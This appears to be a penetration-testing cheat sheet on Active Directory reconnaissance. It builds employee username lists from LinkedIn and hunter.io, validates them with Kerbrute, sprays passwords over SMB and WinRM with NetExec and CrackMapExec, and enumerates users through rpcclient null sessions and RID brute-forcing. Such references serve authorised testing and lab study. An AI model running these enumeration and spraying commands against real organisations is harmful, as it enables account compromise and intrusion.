---
legal-banner: true
---

### **Generate User List**

1. Use sites like hunter.io to discover employee email patterns.  
   For example, entering `apple.com` shows emails often follow `{f}{last}@apple.com`.  
   By scraping a list of Apple employees from LinkedIn, you can convert names into emails (e.g., *Steve Jobs → s.jobs@apple.com*).  
   Not all guesses will be correct, but many should be valid.  

2. Use a Python script to generate potential usernames  
```bash
wget https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py
```  

3. Verify usernames with Kerbrute  
```bash
kerbrute userenum --dc [IP-ADDRESS] -d hackfast.local username.lst
```  

**Note:** You can also use built-in wordlists, e.g.:  
```bash
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```  

### **SMB Enumeration**

1. Enumerate with NetExec  
```bash
netexec smb [IP-ADDRESS] -u users.txt -p '[PASSWORD]' --continue-on-success
```  

2. Enumerate with CrackMapExec  
```bash
crackmapexec smb [IP-ADDRESS] -u users.txt -p '[PASSWORD]' --continue-on-success
```  

### **WinRM Enumeration**

1. Enumerate with NetExec  
```bash
netexec winrm office.htb -u users.txt -p '[PASSWORD]' --continue-on-success
```  

2. Enumerate with CrackMapExec  
```bash
crackmapexec winrm 10.10.10.184 -u users.txt -p '[PASSWORD]' --continue-on-success
```  

### **RPCClient Enumeration**

1. Start null session  
```bash
rpcclient -U "" -N [IP_ADDRESS]
```  

2. List all users in the domain  
```bash
rpcclient -U "" -N [IP_ADDRESS] -c "enumdomusers" > output.txt
```  

3. Extract usernames from output  
```bash
cat output.txt | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users.lst
```  

4. Brute-force user RIDs  
```bash
for i in $(seq 500 1100); do rpcclient -N -U "" [IP_ADDRESS] -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name|user_rid|group_rid" && echo ""; done
```